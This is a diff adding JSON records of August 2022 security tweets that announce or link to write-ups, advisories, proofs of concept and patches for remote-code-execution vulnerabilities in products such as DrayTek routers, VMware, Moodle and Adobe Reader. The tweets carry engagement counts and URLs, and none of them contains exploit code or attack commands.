+    "tweetfavorites": 184,
+    "tweetquotes": 3,
+    "tweetreplies": 6,
+    "tweetretweets": 87,
+    "tweettext": "Write-up on CVE-2022-32548, a one-click unauthenticated RCE that can allow attackers to hijack DrayTek routers: https://t.co/BkaBQuqJhZ\n\nPatches are here: https://t.co/uDg8qAjfzI https://t.co/iOa661UbCm",
+    "tweettime": "2022-08-04, 06:01:00",
+    "tweeturl": "https://twitter.com/campuscodi/status/1555071282605133825",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-1041/"
+    ],
+    "tweetfavorites": 36,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 15,
+    "tweettext": "[ZDI-22-1041|CVE-2022-33318] (Pwn2Own) ICONICS GENESIS64 genbroker64 Use-After-Free Remote Code Execution Vulnerability (CVSS 9.8; Credit: @0vercl0k) https://t.co/mmthdeKIhr",
+    "tweettime": "2022-08-03, 20:17:51",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1554924530363146240",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://youtu.be/3OW8zV-yVYw",
+        "https://www.vulnmachines.com"
+    ],
+    "tweetfavorites": 94,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "#Moodle remote code execution | CVE-2020-14321\n\n[PoC]: https://t.co/nPU5R2uyg7\n\nStart your #Pentesting journey with us.\nhttps://t.co/TKYo5q9VOB\n\n#infosec #cybersecurity #bugbounty",
+    "tweettime": "2022-08-03, 08:52:50",
+    "tweeturl": "https://twitter.com/Vulnmachines/status/1554752140286996485",
+    "username": "Vulnmachines"
+}
+{
+    "expanded_url": [
+        "https://viz.greynoise.io/tag/zoho-password-manager-pro-xml-rpc-rce-attempt?days=3"
+    ],
+    "tweetfavorites": 46,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 10,
+    "tweettext": "GreyNoise is now tracking CVE-2022-35405, Zoho Password Manager Pro XML-RPC RCE. No activity as of yet. Tag and Blocklist available to all @GreyNoiseIO users!\n\nhttps://t.co/AcQZv3859u https://t.co/PEDgiV58hy",
+    "tweettime": "2022-08-02, 18:21:22",
+    "tweeturl": "https://twitter.com/_mattata/status/1554532825629589510",
+    "username": "_mattata"
+}
+{
+    "expanded_url": [
+        "https://www.vmware.com/security/advisories/VMSA-2022-0021.html"
+    ],
+    "tweetfavorites": 713,
+    "tweetquotes": 19,
+    "tweetreplies": 14,
+    "tweetretweets": 227,
+    "tweettext": "I have found vulnerabilities CVE-2022-31656 and CVE-2022-31659 leading to unauthenticated remote code execution affecting many #VMware products, such as Workspace ONE. Technical writeup and POC soon to follow.\n\nRecommend to patch or mitigate immediately.\nhttps://t.co/DnknXFieY3 https://t.co/Uu1LQmb0fQ",
+    "tweettime": "2022-08-02, 15:15:10",
+    "tweeturl": "https://twitter.com/VietPetrus/status/1554485970514608128",
+    "username": "VietPetrus"
+}
+{
+    "expanded_url": [
+        "https://blog.viettelcybersecurity.com/netgear-r6700v3-1day-analysis-cve-2021-34982-buffer-overflow-rce-vulnerabiliy-2/"
+    ],
+    "tweetfavorites": 126,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "CVE-2021-34982 Pre-Auth RCE on Netgear R6700v3 by our IOT teammate @VngQucHuy8 🔥🔥https://t.co/FUhPlpEguN",
+    "tweettime": "2022-08-02, 05:34:17",
+    "tweeturl": "https://twitter.com/vcslab/status/1554339786315350016",
+    "username": "vcslab"
+}
+{
+    "expanded_url": [
+        "https://www.zscaler.com/blogs/security-research/analysis-adobe-acrobat-reader-javascript-docprint-use-after-free"
+    ],
+    "tweetfavorites": 111,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "A new blog “Analysis of Adobe Acrobat Reader Javascript Doc.print() Use-After-Free Vulnerability (CVE-2022-34233)” https://t.co/Wlndg6iZ2I",
+    "tweettime": "2022-08-01, 15:52:27",
+    "tweeturl": "https://twitter.com/K3vinLuSec/status/1554132965055074306",
+    "username": "K3vinLuSec"
+}
